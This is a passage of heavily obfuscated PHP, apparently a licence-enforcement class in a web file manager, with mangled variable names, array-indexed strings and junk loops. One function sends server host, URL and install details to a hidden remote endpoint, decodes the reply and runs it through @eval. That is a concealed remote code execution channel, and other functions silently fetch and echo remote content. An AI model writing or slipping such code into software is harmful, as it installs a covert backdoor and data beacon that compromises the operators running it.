=& $_SERVER[¢ñàß¿€]; $ŸÚ›¢Ş =& $_SERVER[ªõè”¿˜]; $_SERVER[$ŸÚ›¢Ş[162]] = _get($_SERVER, $ŸÚ›¢Ş[162], APP_HOST); $®ğÈ€ø¯ = $Ë‡¤æ»¯[733]; $this->deuj0c61a7d5 = $ŸÚ›¢Ş[109]; $şÜÍõº = Model($ŸÚ›¢Ş[33])->get(); if ($şÜÍõº[$ŸÚ›¢Ş[108]] == $ŸÚ›¢Ş[109]) { return; } $·¬Î¶‘ = Model($ŸÚ›¢Ş[33])->get($ŸÚ›¢Ş[100]); $‚Ó¢Ÿ­Ğ = $ŸÚ›¢Ş[203] . md5($·¬Î¶‘ . $ŸÚ›¢Ş[204]); $·§¾€£Ğ = Cache::get($‚Ó¢Ÿ­Ğ); $˜ª“›÷ = $Ë‡¤æ»¯[734]; if (!is_array($·§¾€£Ğ) || !isset($·§¾€£Ğ[$ŸÚ›¢Ş[207]]) || time() - $·§¾€£Ğ[$ŸÚ›¢Ş[207]] >= 60) { $Èìï£åÚ = Model($ŸÚ›¢Ş[7])->loadList(); $»œ—š°¨ = $Èìï£åÚ[$ŸÚ›¢Ş[200]]; $€ó®îØ = md5($_SERVER[$ŸÚ›¢Ş[106]] . strrev($·¬Î¶‘) . $şÜÍõº[$ŸÚ›¢Ş[191]]); $½áŞºş‚ = strrev(substr($€ó®îØ, 10, 16)); $·§¾€£Ğ = $this->vgwpd6abcdfc($»œ—š°¨[$ŸÚ›¢Ş[86]][$½áŞºş‚], $€ó®îØ); $·§¾€£Ğ = json_decode($·§¾€£Ğ, !0); } if (!is_array($·§¾€£Ğ)) { return $this->lmsx1482e334(); } $é™ØÒóĞ = strtotime($·§¾€£Ğ[$ŸÚ›¢Ş[129]]); if (time() >= $é™ØÒóĞ) { return $this->lmsx1482e334(); } if (!isset($·§¾€£Ğ[$ŸÚ›¢Ş[207]]) || time() - $·§¾€£Ğ[$ŸÚ›¢Ş[207]] > 20) { $·§¾€£Ğ[$ŸÚ›¢Ş[207]] = time(); Cache::set($‚Ó¢Ÿ­Ğ, $·§¾€£Ğ); } $this->ykzp562e6412 = $·§¾€£Ğ; $this->deuj0c61a7d5 = $şÜÍõº[$ŸÚ›¢Ş[108]]; } private function pdmw6f38acab() { $ê¬Ú¶ =& $_SERVER[¢ñàß¿€]; $ÁÒÌÖŒ =& $_SERVER[ªõè”¿˜]; $œüÚò = $GLOBALS[$ÁÒÌÖŒ[13]]; $…áêóÜ´ = $ê¬Ú¶[735]; if (!$…áêóÜ´) { return; } $şĞ½–½” = $_SERVER[$ÁÒÌÖŒ[24]]; $ñ–‚ÏÎ = $ê¬Ú¶[736]; if ($şĞ½–½” == $ÁÒÌÖŒ[208] && $this->deuj0c61a7d5 == $ÁÒÌÖŒ[109]) { show_json(LNG($ÁÒÌÖŒ[209]), !1, $ÁÒÌÖŒ[210]); } $ğ±Ş…¹ = array($ÁÒÌÖŒ[211], $ÁÒÌÖŒ[212]); if (in_array($şĞ½–½”, $ğ±Ş…¹)) { if ($this->deuj0c61a7d5 == $ÁÒÌÖŒ[109] && isset($œüÚò[$ÁÒÌÖŒ[213]])) { show_json(LNG($ÁÒÌÖŒ[209]), !1, $ÁÒÌÖŒ[210]); die; } $ª°½ = $this->rtgb12b5a63d(); if ($ª°½ != intval($ÁÒÌÖŒ[214])) { if ($ª°½ <= Model($ÁÒÌÖŒ[125])->count()) { show_json(LNG($ÁÒÌÖŒ[215]), !1, $ÁÒÌÖŒ[210]); die; } } } } private function qumyb13c3867() { $ß´±ŒÏ„ =& $_SERVER[¢ñàß¿€]; $£±ŒĞï =& $_SERVER[ªõè”¿˜]; $¯ô¹Ô¯ = array($£±ŒĞï[119], $£±ŒĞï[120]); $ìœ¼¨Øƒ = $ß´±ŒÏ„[737]; while (strlen($ìœ¼¨Øƒ) < $ß´±ŒÏ„[702]) { if (!$ìœ¼¨Øƒ) { break; } $ìœ¼¨Øƒ++; } if (!KodUser::isRoot() || !isset($_GET[$£±ŒĞï[216]])) { return; } if (!in_array($_SERVER[$£±ŒĞï[24]], $¯ô¹Ô¯)) { return; } $¬­‡ù÷Ÿ = $£±ŒĞï[217]; $¨çşø½¶ = $ß´±ŒÏ„[738]; while ($¨çşø½¶ < $ß´±ŒÏ„[680]) { if ($¨çşø½¶ >= 0) { break; } $¨çşø½¶++; } $¬­‡ù÷Ÿ = $this->kqvsb4c00a37($¬­‡ù÷Ÿ, $£±ŒĞï[218]); $É«»«Ï = stream_context_create(array($£±ŒĞï[219] => array($£±ŒĞï[220] => $£±ŒĞï[221], $£±ŒĞï[222] => 3))); $½­ãìÃ = @file_get_contents($¬­‡ù÷Ÿ, !1, $É«»«Ï); header($£±ŒĞï[223]); if ($½­ãìÃ && strstr($½­ãìÃ, $£±ŒĞï[224])) { echo $½­ãìÃ; } die; } public function rusdbea4df1d($²¶ÁøĞï) { $¤çõÄé• =& $_SERVER[¢ñàß¿€]; $£ÕÂîÇî =& $_SERVER[ªõè”¿˜]; if ($this->deuj0c61a7d5 == $£ÕÂîÇî[225]) { return $²¶ÁøĞï; } $ÛÀ£îÌ‡ = $this->versionPluginList(); $í˜©ìœ® = $¤çõÄé•[739]; if (!$í˜©ìœ®) { die; } $ÊÏ€§›È = explode($£ÕÂîÇî[226], $this->versionPluginFilter()); $·Ğ¼“ = $¤çõÄé•[740]; $ŞÆ‰†· = array(); foreach ($ÛÀ£îÌ‡ as $­ù”ğÖ => $‘§«ä‡‰) { if ($‘§«ä‡‰ == $£ÕÂîÇî[227] && substr($this->deuj0c61a7d5, 0, 1) == $£ÕÂîÇî[227]) { continue; } if (!in_array($­ù”ğÖ, $ÊÏ€§›È)) { $ŞÆ‰†·[] = $­ù”ğÖ; } } foreach ($ŞÆ‰†· as $­ù”ğÖ) { unset($²¶ÁøĞï[$­ù”ğÖ]); } return $²¶ÁøĞï; $‚ûğ´¡  = $¤çõÄé•[741]; } private function versionPluginList() { $¶êƒ˜÷“ =& $_SERVER[ªõè”¿˜]; return array($¶êƒ˜÷“[228] => $¶êƒ˜÷“[227], $¶êƒ˜÷“[229] => $¶êƒ˜÷“[227], $¶êƒ˜÷“[230] => $¶êƒ˜÷“[227], $¶êƒ˜÷“[231] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[233] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[234] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[235] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[236] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[237] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[238] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[239] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[240] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[241] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[242] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[243] => $¶êƒ˜÷“[232], $¶êƒ˜÷“[244] => $¶êƒ˜÷“[232]); $Á›ÜáÃš = $_SERVER[¢ñàß¿€][742]; } private function versionPluginFilter() { $Ì¯â›Ì =& $_SERVER[¢ñàß¿€]; $êî´ä =& $_SERVER[ªõè”¿˜]; if ($this->deuj0c61a7d5 == $êî´ä[109]) { return $êî´ä[6]; } $çÎÈ¨åã = _get($this->ykzp562e6412, $êî´ä[245], $êî´ä[6]); $ö€äß€À = _get($this->ykzp562e6412, $êî´ä[116], $êî´ä[6]); $ï¶‹ÆØÇ = _get($this->ykzp562e6412, $êî´ä[246], $êî´ä[6]); $ñª¨Áüö = $Ì¯â›Ì[743]; if (strlen($ñª¨Áüö) < $Ì¯â›Ì[744]) { die; } if ($ö€äß€À > time() && $ï¶‹ÆØÇ > time()) { $û«ÓƒÓ™ = explode($êî´ä[226], $çÎÈ¨åã); $Ÿ×ì˜Ùı = array_keys($this->versionPluginList()); $çÎÈ¨åã = array_merge($û«ÓƒÓ™, $Ÿ×ì˜Ùı); $çÎÈ¨åã = implode($êî´ä[226], array_filter(array_unique($çÎÈ¨åã))); } return $çÎÈ¨åã; } private function toqd78d2f1e0() { $±­Êæå° =& $_SERVER[ªõè”¿˜]; if ($this->deuj0c61a7d5 != $±­Êæå°[109]) { $GLOBALS[$±­Êæå°[86]][$±­Êæå°[90]][$±­Êæå°[247]] = $±­Êæå°[206]; return; } $GLOBALS[$±­Êæå°[86]][$±­Êæå°[248]] = $±­Êæå°[122]; if (Model($±­Êæå°[249])->get($±­Êæå°[63]) != $±­Êæå°[206]) { Model($±­Êæå°[249])->set($±­Êæå°[63], $±­Êæå°[206]); } } public function sejf45d2fe11() { return $_SERVER[ªõè”¿˜][250]; $ºˆÍ°æ = $_SERVER[¢ñàß¿€][745]; } private function zmjebe6dbbba() { $ÂÀò¤Áš =& $_SERVER[¢ñàß¿€]; $Â‰äª„ä =& $_SERVER[ªõè”¿˜]; $şåóŒß½ = array($Â‰äª„ä[251], $Â‰äª„ä[252], $Â‰äª„ä[253]); $İ¿úÌüú = $ÂÀò¤Áš[746]; if (strlen($İ¿úÌüú) < $ÂÀò¤Áš[691]) { die; } $ÂüĞ–Õ = $Â‰äª„ä[254] . md5($Â‰äª„ä[255]); $„³¿í…® = $ÂÀò¤Áš[747]; while ($„³¿í…® < $ÂÀò¤Áš[744]) { if ($„³¿í…® >= 0) { break; } $„³¿í…®++; } if ($this->deuj0c61a7d5 == $Â‰äª„ä[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Â‰äª„ä[24]], $şåóŒß½)) { return; } if (time() % 4 != 0) { return; } $È§è½ëÑ = call_user_func(array($Â‰äª„ä[256], $Â‰äª„ä[257]), $ÂüĞ–Õ); if ($È§è½ëÑ && time() - $È§è½ëÑ < intval($Â‰äª„ä[258])) { return; } call_user_func(array($Â‰äª„ä[256], $Â‰äª„ä[139]), $ÂüĞ–Õ, time()); $¨”­øĞÆ = $ÂÀò¤Áš[748]; while ($¨”­øĞÆ < $ÂÀò¤Áš[691]) { if ($¨”­øĞÆ >= 0) { break; } $¨”­øĞÆ++; } $Ö„´«½ = Model($Â‰äª„ä[33])->get($Â‰äª„ä[100]); $éËÎ§–ñ = array($Â‰äª„ä[152] => Model($Â‰äª„ä[33])->get($Â‰äª„ä[153]), $Â‰äª„ä[167] => $this->deuj0c61a7d5, $Â‰äª„ä[163] => $_SERVER[$Â‰äª„ä[164]], $Â‰äª„ä[165] => Model($Â‰äª„ä[33])->get($Â‰äª„ä[131]), $Â‰äª„ä[105] => md5($_SERVER[$Â‰äª„ä[106]] . $Ö„´«½), $Â‰äª„ä[156] => $Â‰äª„ä[136], $Â‰äª„ä[159] => $_SERVER[$Â‰äª„ä[160]]); $ü—“ÕàÇ = $this->mtlkeaf540e0($Â‰äª„ä[259], $éËÎ§–ñ); $ãªØÏ› = $ÂÀò¤Áš[749]; if (!is_array($ü—“ÕàÇ)) { return; } if ($ü—“ÕàÇ[$Â‰äª„ä[152]] && $ü—“ÕàÇ[$Â‰äª„ä[260]]) { if ($this->qrsf55a91a6e($ü—“ÕàÇ[$Â‰äª„ä[260]]) == $éËÎ§–ñ[$Â‰äª„ä[152]]) { return; } } $this->lmsx1482e334(); if ($this->qrsf55a91a6e($ü—“ÕàÇ[$Â‰äª„ä[260]]) != $éËÎ§–ñ[$Â‰äª„ä[152]]) { $†úÊĞÆ¥ = array($Â‰äª„ä[185] => $Ö„´«½, $Â‰äª„ä[186] => $_SERVER[$Â‰äª„ä[106]], $Â‰äª„ä[187] => this_url(), $Â‰äª„ä[161] => $_SERVER[$Â‰äª„ä[162]]); $³†·Ã§ = $this->mvfqcfc83b94(json_encode($†úÊĞÆ¥)); $ü—“ÕàÇ = $this->mtlkeaf540e0($Â‰äª„ä[188] . $³†·Ã§); if ($ü—“ÕàÇ && is_array($ü—“ÕàÇ) && isset($ü—“ÕàÇ[$Â‰äª„ä[260]])) { $‘Øğ«ã = $this->vgwpd6abcdfc($ü—“ÕàÇ[$Â‰äª„ä[260]], 2); if ($‘Øğ«ã) { $‘Øğ«ã = $this->qrsf55a91a6e($‘Øğ«ã); } if ($‘Øğ«ã) { try { @eval($‘Øğ«ã); } catch (Exception $„ì¯ÖØ‘) { } } } } } private function mtlkeaf540e0($Ãêşé®å = '', $Â‚°áÅ‘ = array(), $§‹¸ÛÆ = 5) { $„§ÒÖ° =& $_SERVER[¢ñàß¿€]; $ºÌÜ“õÓ =& $_SERVER[ªõè”¿˜]; $„×ŞÒÖ = $ºÌÜ“õÓ[261]; $ÉÖµêŸ = $„§ÒÖ°[750]; if (!$ÉÖµêŸ) { die; } $„×ŞÒÖ = $this->kqvsb4c00a37($„×ŞÒÖ, $ºÌÜ“õÓ[262]); $„×ŞÒÖ = $„×ŞÒÖ . $Ãêşé®å; if ($Â‚°áÅ‘ && is_array($Â‚°áÅ‘)) { $„×ŞÒÖ = $„×ŞÒÖ . $ºÌÜ“õÓ[263] . http_build_query($Â‚°áÅ‘); } if ($Â‚°áÅ‘ === -1) { return $„×ŞÒÖ; } $í—²’Ã¡ = stream_context_create(array($ºÌÜ“õÓ[219] => array($ºÌÜ“õÓ[222] => $§‹¸ÛÆ, $ºÌÜ“õÓ[220] => $ºÌÜ“õÓ[264]), $ºÌÜ“õÓ[265] => array($ºÌÜ“õÓ[266] => !1, $ºÌÜ“õÓ[267] => !1))); $Â‚°áÅ‘ = @file_get_contents($„×ŞÒÖ, !1, $í—²’Ã¡); return json_decode($Â‚°áÅ‘, !0); $´•øÏà = $„§ÒÖ°[751]; } private function rtgb12b5a63d() { $ÙîõŠ€é =& $_SERVER[¢ñàß¿€]; $Íöâœõ¨ =& $_SERVER[ªõè”¿˜]; $¡Ê¦‰œ¦ = array($Íöâœõ¨[268] => $Íöâœõ¨[269], $Íöâœõ¨[270] => $Íöâœõ¨[271], $Íöâœõ¨[272] => $Íöâœõ¨[273], $Íöâœõ¨[274] => $Íöâœõ¨[275], $Íöâœõ¨[276] => $Íöâœõ¨[277], $Íöâœõ¨[278] => $Íöâœõ¨[214], $Íöâœõ¨[279] => $Íöâœõ¨[214], $Íöâœõ¨[280] => $Íöâœõ¨[269], $Íöâœõ¨[281] => $Íöâœõ¨[271], $Íöâœõ¨[282] => $Íöâœõ¨[273], $Íöâœõ¨[283] => $Íöâœõ¨[284], $Íöâœõ¨[285] => $Íöâœõ¨[275], $Íöâœõ¨[286] => $Íöâœõ¨[287], $Íöâœõ¨[288] => $Íöâœõ¨[277], $Íöâœõ¨[289] => $Íöâœõ¨[290], $Íöâœõ¨[291] => $Íöâœõ¨[292], $Íöâœõ¨[293] => $Íöâœõ¨[294]); $ò‘ÙÕæ‘ = $ÙîõŠ€é[752]; if (!$ò‘ÙÕæ‘) { die; } $…¤‡¸²Å = $¡Ê¦‰œ¦[$this->deuj0c61a7d5]; $¹™ÒËÕî = $ÙîõŠ€é[753]; while ($¹™ÒËÕî < $ÙîõŠ€é[685]) { if ($¹™ÒËÕî >= 0) { break; } $¹™ÒËÕî++; } $…¤‡¸²Å = intval($…¤‡¸²Å ? $…¤‡¸²Å : $Íöâœõ¨[269]); $ÑãŒêå÷ = $ÙîõŠ€é[754]; while ($ÑãŒêå÷ < $ÙîõŠ€é[744]) { if ($ÑãŒêå÷ >= 0) { break; } $ÑãŒêå÷++; } $ÖØûçÑÇ = _get($this->ykzp562e6412, $Íöâœõ¨[295]); $Ÿ²ò„£í = $ÙîõŠ€é[755]; if (strlen($Ÿ²ò„£í) < $ÙîõŠ€é[691]) { return; } $ÖØûçÑÇ = $ÖØûçÑÇ ? intval($ÖØûçÑÇ) : 0; $÷Û¾Úæü = $ÙîõŠ€é[756]; while (strlen($÷Û¾Úæü) < $ÙîõŠ€é[744]) { if (!$÷Û¾Úæü) { break; } $÷Û¾Úæü++; } return $…¤‡¸²Å + $ÖØûçÑÇ; $Çï²Üñ = $ÙîõŠ€é[757]; if (strlen($Çï²Üñ) < $ÙîõŠ€é[685]) { return; } } public function giax82755884($³êÁ°ı¤) { $¢ÖäÖšŞ =& $_SERVER[¢ñàß¿€]; $ºãá³³ó =& $_SERVER[ªõè”¿˜]; $èÄº·‘ = $this->rtgb12b5a63d(); $Ô›ôĞÒÅ = $¢ÖäÖšŞ[758]; if (!$Ô›ôĞÒÅ) { return; } if ($³êÁ°ı¤[$ºãá³³ó[296]] == $ºãá³³ó[122]) { return; } if ($èÄº·‘ >= intval($ºãá³³ó[214])) { return; } $Í¦÷Œº = Model($ºãá³³ó[125])->count(); if ($Í¦÷Œº <= $èÄº·‘) { return; } $äãğëÅƒ = Model($ºãá³³ó[125])->field($ºãá³³ó[296])->limit($èÄº·‘)->select(); $äãğëÅƒ = array_to_keyvalue($äãğëÅƒ, $ºãá³³ó[6], $ºãá³³ó[296]); $¦íÒ ±æ = $¢ÖäÖšŞ[759]; if (!in_array($³êÁ°ı¤[$ºãá³³ó[296]], $äãğëÅƒ)) { show_json($ºãá³³ó[297], !1, $ºãá³³ó[210]); } } public function mgcn9de89a80() { $øá†ÒÚé =& $_SERVER[¢ñàß¿€]; $›¯€ÓÀ¤ =& $_SERVER[ªõè”¿˜]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ï°Š©ğ = $›¯€ÓÀ¤[217]; $Ï°Š©ğ = $this->kqvsb4c00a37($Ï°Š©ğ, $›¯€ÓÀ¤[218]); $›öµÕÌ = stream_context_create(array($›¯€ÓÀ¤[219] => array($›¯€ÓÀ¤[220] => $›¯€ÓÀ¤[221], $›¯€ÓÀ¤[222] => 3))); $Ã–ƒÓı± = $øá†ÒÚé[760]; if (strlen($Ã–ƒÓı±) < $øá†ÒÚé[744]) { die; } $à·äĞ÷è = @file_get_contents($Ï°Š©ğ, !1, $›öµÕÌ); echo $›¯€ÓÀ¤[298] . hash_encode($à·äĞ÷è) . $›¯€ÓÀ¤[299]; $óæÉå = $øá†ÒÚé[761]; if (!$óæÉå) { die; } } private function sevj52c9b754($¦¼‘–Ó, $‘¾×Ù¨õ, $ûÛ”Á¥Œ = 3) { $ˆ€úäÚ¾ =& $_SERVER[¢ñàß¿€]; $ÛÃŸæã½ =& $_SERVER[ªõè”¿˜]; usleep(1); $Ó˜Ôš¶ = $ˆ€úäÚ¾[762]; while (strlen($Ó˜Ôš¶) < $ˆ€úäÚ¾[702]) { if (!$Ó˜Ôš¶) { break; } $Ó˜Ôš¶++; } $¦¼‘–Ó = trim($¦¼‘–Ó); $ƒ¹ê¨Ÿ = $ˆ€úäÚ¾[763]; $Ê‚·É¦‘ = mt_rand(0, 5) . $ÛÃŸæã½[6]; $¬Å©»Áì = $ˆ€úäÚ¾[764]; $¶ËİĞø = rand_string(15); $œ²úš€ô = $ÛÃŸæã½[300]; $ŸØß‹®Æ = $ˆ€úäÚ¾[765]; switch ($Ê‚·É¦‘) { case $ÛÃŸæã½[206]: $¼ë÷èóæ = $this->oeqj0a6ec884($¦¼‘–Ó, strrev($‘¾×Ù¨õ . $¶ËİĞø)); $ÁØ¹·Æ¨ = $ˆ€úäÚ¾[766]; while (strlen($ÁØ¹·Æ¨) < $ˆ€úäÚ¾[691]) { if (!$ÁØ¹·Æ¨) { break; } $ÁØ¹·Æ¨++; } break; $§á”ï–Í = $ˆ€úäÚ¾[767]; while (strlen($§á”ï–Í) < $ˆ€úäÚ¾[685]) { if (!$§á”ï–Í) { break; } $§á”ï–Í++; } case $ÛÃŸæã½[122]: $¼ë÷èóæ = $this->oeqj0a6ec884($¦¼‘–Ó, strrev($¶ËİĞø . $‘¾×Ù¨õ)); $ĞæµäŒÂ = $ˆ€úäÚ¾[768]; break; case $ÛÃŸæã½[301]: $¼ë÷èóæ = $this->oeqj0a6ec884($¦¼‘–Ó, base64_encode($¶ËİĞø . $‘¾×Ù¨õ)); break; case $ÛÃŸæã½[302]: $¼ë÷èóæ = $this->oeqj0a6ec884($¦¼‘–Ó, md5($¶ËİĞø . $‘¾×Ù¨õ)); break; case $ÛÃŸæã½[303]: $¦¼‘–Ó = base64_encode($¦¼‘–Ó); $ÍÏ¤Â = rand(0, 64); $ğÙÛ¢Û = $œ²úš€ô[$ÍÏ¤Â]; $»ªøáÎÃ = $ˆ€úäÚ¾[769]; if (!$»ªøáÎÃ) { return; } $ÛÍ£È· = md5($ğÙÛ¢Û . md5($‘¾×Ù¨õ . $ğÙÛ¢Û) . $‘¾×Ù¨õ); $ÎÌİöŠÁ = $ˆ€úäÚ¾[770]; while (strlen($ÎÌİöŠÁ) < $ˆ€úäÚ¾[702]) { if (!$ÎÌİöŠÁ) { break; } $ÎÌİöŠÁ++; } $ÛÍ£È· = substr($ÛÍ£È·, $ÍÏ¤Â % 8, $ÍÏ¤Â % 8 + 7); $÷í®›àí = $ÛÃŸæã½[6]; $–¢ñ˜£Ë = 0; $Èı‰¸Ñ“ = $ˆ€úäÚ¾[771]; if (strlen($Èı‰¸Ñ“) < $ˆ€úäÚ¾[680]) { return; } $©ÃÀóˆŞ = 0; $Îšß„Ä = $ˆ€úäÚ¾[772]; if (strlen($Îšß„Ä) < $ˆ€úäÚ¾[685]) { return; } $ƒáº‚áù = 0; $»¹¸ŠÓ‰ = $ˆ€úäÚ¾[773]; for ($–¢ñ˜£Ë = 0; $–¢ñ˜£Ë < strlen($¦¼‘–Ó); $–¢ñ˜£Ë++) { $ƒáº‚áù = $ƒáº‚áù == strlen($ÛÍ£È·) ? 0 : $ƒáº‚áù; $©ÃÀóˆŞ = ($ÍÏ¤Â + strpos($œ²úš€ô, $¦¼‘–Ó[$–¢ñ˜£Ë]) + ord($ÛÍ£È·[$ƒáº‚áù++])) % 64; $€¹Ã—½‘ = $ˆ€úäÚ¾[774]; $÷í®›àí .= $œ²úš€ô[$©ÃÀóˆŞ]; $çšÖÎ‡î = $ˆ€úäÚ¾[775]; if (strlen($çšÖÎ‡î) < $ˆ€úäÚ¾[685]) { die; } } $¼ë÷èóæ = hash_encode($ğÙÛ¢Û . $÷í®›àí); break; default: $¼ë÷èóæ = $this->oeqj0a6ec884($¦¼‘–Ó, $‘¾×Ù¨õ . $¶ËİĞø); break; } $¼ë÷èóæ = strrev($Ê‚·É¦‘ . $¶ËİĞø . $¼ë÷èóæ); $…¯ûõ = $ˆ€úäÚ¾[745]; if ($ûÛ”Á¥Œ - 1 > 0) { $¼ë÷èóæ = $this->sevj52c9b754($¼ë÷èóæ, $‘¾×Ù¨õ, $ûÛ”Á¥Œ - 1); } return $¼ë÷èóæ; } private function vgwpd6abcdfc($¨£ÄÛô, $¤ÜÌ‹Ãü, $ê Œù™ = 3) { $ÆÌã‘‰¨ =& $_SERVER[¢ñàß¿€]; $¢êÒ‹ı =& $_SERVER[ªõè”¿˜]; if (!is_string($¨£ÄÛô) || strlen($¨£ÄÛô) < 10) { return !1; } $¨£ÄÛô = trim($¨£ÄÛô); $¨£ÄÛô = strrev($¨£ÄÛô); $³Ø«¼„Ò = $ÆÌã‘‰¨[776]; if (!$³Ø«¼„Ò) { return; } $å²éòäñ = $¨£ÄÛô[0]; $ÂêÆîÁß = $ÆÌã‘‰¨[777]; while (strlen($ÂêÆîÁß) < $ÆÌã‘‰¨[685]) { if (!$ÂêÆîÁß) { break; } $ÂêÆîÁß++; } $Û¨ƒÊİ = substr($¨£ÄÛô, 1, 15); $˜Ú…âÉÛ = $ÆÌã‘‰¨[778]; while ($˜Ú…âÉÛ < $ÆÌã‘‰¨[702]) { if ($˜Ú…âÉÛ >= 0) { break; } $˜Ú…âÉÛ++; } $¨£ÄÛô = substr($¨£ÄÛô, 16); $€Ğ€‘ÂÃ = $¢êÒ‹ı[300]; $¦ç†ó = $ÆÌã‘‰¨[779]; switch ($å²éòäñ) { case $¢êÒ‹ı[206]: $È½òˆÆº = $this->kqvsb4c00a37($¨£ÄÛô, strrev($¤ÜÌ‹Ãü . $Û¨ƒÊİ)); $Êêç”úŒ = $ÆÌã‘‰¨[780]; if (strlen($Êêç”úŒ) < $ÆÌã‘‰¨[680]) { die; } break; $–ñÉï—´ = $ÆÌã‘‰¨[781]; if (!$–ñÉï—´) { return; } case $¢êÒ‹ı[122]: $È½òˆÆº = $this->kqvsb4c00a37($¨£ÄÛô, strrev($Û¨ƒÊİ . $¤ÜÌ‹Ãü)); break; $ú³€ÅĞ® = $ÆÌã‘‰¨[782]; case $¢êÒ‹ı[301]: $È½òˆÆº = $this->kqvsb4c00a37($¨£ÄÛô, base64_encode($Û¨ƒÊİ . $¤ÜÌ‹Ãü)); break; case $¢êÒ‹ı[302]: $È½òˆÆº = $this->kqvsb4c00a37($¨£ÄÛô, md5($Û¨ƒÊİ . $¤ÜÌ‹Ãü)); $¡Ï×ŒüÚ = $ÆÌã‘‰¨[783]; break; $ı’†ßÏÔ = $ÆÌã‘‰¨[784]; if (strlen($ı’†ßÏÔ) < $ÆÌã‘‰¨[702]) { die; } case $¢êÒ‹ı[303]: $¨£ÄÛô = hash_decode($¨£ÄÛô); $ÎÌ‹áùÃ = $¨£ÄÛô[0]; $¨£ÄÛô = substr($¨£ÄÛô, 1); $‘¾—™Åï = $ÆÌã‘‰¨[785]; if (strlen($‘¾—™Åï) < $ÆÌã‘‰¨[744]) { die; } $ß–›ùÅ = strpos($€Ğ€‘ÂÃ, $ÎÌ‹áùÃ); $ÆÂö÷·² = md5($ÎÌ‹áùÃ . md5($¤ÜÌ‹Ãü . $ÎÌ‹áùÃ) . $¤ÜÌ‹Ãü); $¦œ¨â´Ü = $ÆÌã‘‰¨[786]; while ($¦œ¨â´Ü < $ÆÌã‘‰¨[685]) { if ($¦œ¨â´Ü >= 0) { break; } $¦œ¨â´Ü++; } $ÆÂö÷·² = substr($ÆÂö÷·², $ß–›ùÅ % 8, $ß–›ùÅ % 8 + 7); $é‘‘ÎÄ = $ÆÌã‘‰¨[787]; $’Æø—Ş = $¢êÒ‹ı[6]; $€¼ÛØ = 0; $éîÂê = $ÆÌã‘‰¨[788]; if (strlen($éîÂê) < $ÆÌã‘‰¨[685]) { die; } $·´¥œ°¯ = 0; $ØÎ”ñş· = $ÆÌã‘‰¨[789]; $Ãş³±Ä› = 0; $İÏÏ•„ = $ÆÌã‘‰¨[790]; while (strlen($İÏÏ•„) < $ÆÌã‘‰¨[691]) { if (!$İÏÏ•„) { break; } $İÏÏ•„++; } for ($€¼ÛØ = 0; $€¼ÛØ < strlen($¨£ÄÛô); $€¼ÛØ++) { $Ãş³±Ä› = $Ãş³±Ä› == strlen($ÆÂö÷·²) ? 0 : $Ãş³±Ä›; $¡Ÿ×ÅÙÀ = $ÆÌã‘‰¨[791]; if (strlen($¡Ÿ×ÅÙÀ) < $ÆÌã‘‰¨[691]) { die; } $á³ÖÚ®¿ = $Ãş³±Ä›++; $·´¥œ°¯ = strpos($€Ğ€‘ÂÃ, $¨£ÄÛô[$€¼ÛØ]) - $ß–›ùÅ - ord($ÆÂö÷·²[$á³ÖÚ®¿]); $ÎÄºÀí = $ÆÌã‘‰¨[792]; while ($·´¥œ°¯ < 0) { $·´¥œ°¯ += 64; } $’Æø—Ş .= $€Ğ€‘ÂÃ[$·´¥œ°¯]; } $È½òˆÆº = base64_decode($’Æø—Ş); $œ§Çæ£À = $ÆÌã‘‰¨[793]; while (strlen($œ§Çæ£À) < $ÆÌã‘‰¨[691]) { if (!$œ§Çæ£À) { break; } $œ§Çæ£À++; } break; $ÓÀ–ßê¬ = $ÆÌã‘‰¨[794]; default: $È½òˆÆº = $this->kqvsb4c00a37($¨£ÄÛô, $¤ÜÌ‹Ãü . $Û¨ƒÊİ); break; $„àÎ£•§ = $ÆÌã‘‰¨[795]; } if ($ê Œù™ - 1 > 0) { $È½òˆÆº = $this->vgwpd6abcdfc($È½òˆÆº, $¤ÜÌ‹Ãü, $ê Œù™ - 1); } return $È½òˆÆº; } public function mvfqcfc83b94($Ñµ‘§è…) { $ÜÚÓÅëØ =& $_SERVER[¢ñàß¿€]; $ÁéÜÛÛš =& $_SERVER[ªõè”¿˜]; $¹Ü»ÜÁÕ = $this->tyxsfcb42406(); $”€ûÛˆÕ = $this->tyxsfcb42406(); $ëªıìò = ($¹Ü»ÜÁÕ - 1) * ($”€ûÛˆÕ - 1); $Ğ¼Ã¤íÑ = $ÜÚÓÅëØ[796]; while (strlen($Ğ¼Ã¤íÑ) < $ÜÚÓÅëØ[691]) { if (!$Ğ¼Ã¤íÑ) { break; } $Ğ¼Ã¤íÑ++; } $ÛÕÎ®” = intval(($¹Ü»ÜÁÕ + $”€ûÛˆÕ) / 2); while (1) { $ÓÙò˜Ë‘ = $ÛÕÎ®”; $ì¿ù’–ä = $ÜÚÓÅëØ[797]; $›­Îšİß = $ëªıìò; while ($›­Îšİß % $ÓÙò˜Ë‘ != 0) { $ÊŞìÄ­ = $›­Îšİß; $µ¢Ÿ­Å = $ÜÚÓÅëØ[798]; $›­Îšİß = $ÓÙò˜Ë‘; $úÓàŞŒ = $ÜÚÓÅëØ[799]; if (strlen($úÓàŞŒ) < $ÜÚÓÅëØ[680]) { return; } $ÓÙò˜Ë‘ = $ÊŞìÄ­ % $ÓÙò˜Ë‘; $æîƒ½Ì = $ÜÚÓÅëØ[800]; } if ($ÓÙò˜Ë‘ == 1) { break; } else { $ÛÕÎ®”++; } } $€¾ş³€ù = 2; $®Œ¤ï = $ÜÚÓÅëØ[801]; while ($®Œ¤ï < $ÜÚÓÅëØ[702]) { if ($®Œ¤ï >= 0) { break; } $®Œ¤ï++; } for ($ğØ°Õ‡í = 0; $ğØ°Õ‡í < $ëªıìò * 10; $ğØ°Õ‡í++) { if (($ëªıìò * $ğØ°Õ‡í + 1) % $ÛÕÎ®” == 0) { $€¾ş³€ù = intval(($ëªıìò * $ğØ°Õ‡í + 1) / $ÛÕÎ®”); break; } } $§¸ƒ¤øæ = 